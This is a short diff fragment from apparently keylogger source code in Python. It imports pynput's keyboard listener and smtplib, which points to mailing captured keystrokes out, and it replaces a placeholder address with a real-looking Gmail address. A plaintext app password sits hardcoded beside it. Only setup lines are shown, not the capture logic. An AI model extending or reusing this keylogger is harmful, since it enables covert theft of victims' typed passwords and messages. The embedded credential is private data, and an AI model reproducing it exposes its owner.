@@ -2,7 +2,7 @@ import smtplib, ssl
 from email.message import EmailMessage
 from pynput import keyboard
 
-email = "sample@gmail.com"
+email = "johndoveisgoat@gmail.com"
 passwd = "snygbstrarxwmxwt"
 
 logs_keylogger = ""
